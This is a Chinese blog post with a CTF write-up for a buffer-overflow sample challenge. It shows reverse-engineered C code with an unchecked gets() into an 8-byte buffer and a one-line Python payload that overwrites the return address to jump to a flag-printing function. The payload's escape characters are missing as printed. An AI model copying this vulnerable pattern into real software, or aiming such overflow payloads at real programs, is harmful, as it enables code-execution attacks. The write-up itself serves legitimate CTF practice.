---
title: 中软吉大•问鼎杯决赛样题溢出类
author: Ripples
layout: post
views:
  - 865
categories:
  - CTF
tags:
  - buffer overflow
  - reversing
  - 中软吉大•问鼎杯
---
<p style="text-indent: 2em;">
  题目如下：
</p>

<p style="text-indent: 2em;">
  下载test.exe文件，请想方法找到key。<a href="http://sec.hdu.edu.cn/SecTest/files/6.test.exe">文件下载</a>（500分）
</p>

<p style="text-indent: 2em;">
  首先是逆向，仿写程序如下：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">const&nbsp;char&nbsp;password[]&nbsp;=&nbsp;"$1$k3Eadsf$blee.9JxQ75A/dSQSxW3v/";

void&nbsp;authorized()
{
&nbsp;&nbsp;&nbsp;&nbsp;printf("V0RGbGFnPQ==");
&nbsp;&nbsp;&nbsp;&nbsp;printf("{");
&nbsp;&nbsp;&nbsp;&nbsp;printf("%sn",&nbsp;md5("kernel32.GetVesion"));
&nbsp;&nbsp;&nbsp;&nbsp;printf("}");
}

void&nbsp;doit()
{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;s[8];
&nbsp;&nbsp;&nbsp;&nbsp;printf("please&nbsp;input&nbsp;the&nbsp;password:");
&nbsp;&nbsp;&nbsp;&nbsp;gets(s);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(md5(s),&nbsp;password)&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;authorized();
&nbsp;&nbsp;&nbsp;&nbsp;}
}

int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;doit();
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</pre>

<p style="text-indent: 2em;">
  其中V0RGbGFnPQ==为WDFlag=的base64加密后的值。
</p>

<p style="text-indent: 2em;">
  程序是逆向清楚了，但是完全不明白这个题目是想让我们干嘛了，难道说key就是kernel32.GetVesion，那直接逆向就得到了，还要溢出干嘛，并且溢出得到的是md5之后的值，要由md5得到kernel32.GetVesion也不容易吧……
</p>

<p style="text-indent: 2em;">
  不管咋样，还是溢出一个吧，s和doit()的返回地址差了8 bytes，authorized的地址0x00401C40，所以溢出如下：
</p>

<pre class="brush:ps;toolbar:false;">python&nbsp;-c&nbsp;"print&nbsp;&#39;a&#39;&nbsp;*&nbsp;8&nbsp;+&nbsp;&#39;x40x1Cx40x00&#39;"&nbsp;&gt;&nbsp;payload
6.test.exe&nbsp;&lt;&nbsp;payload</pre>

<p style="text-indent: 2em;">
  对于这题，只能说完全不知道想干嘛了，反正是样题，就这样吧～～～
</p>

<p style="text-indent: 2em;">
  <img src="http://geekjayvic.sinaapp.com/wp-content/plugins/wp-ueditor2/ueditor/dialogs/attachment/fileTypeImages/icon_rar.gif" style="line-height: 16px; white-space: normal;" /><a href="http://geekjayvic-wordpress.stor.sinaapp.com/uploads/2014/09/6.test_.exe.zip" style="line-height: 16px; white-space: normal;">6.test.exe.zip</a>
</p>
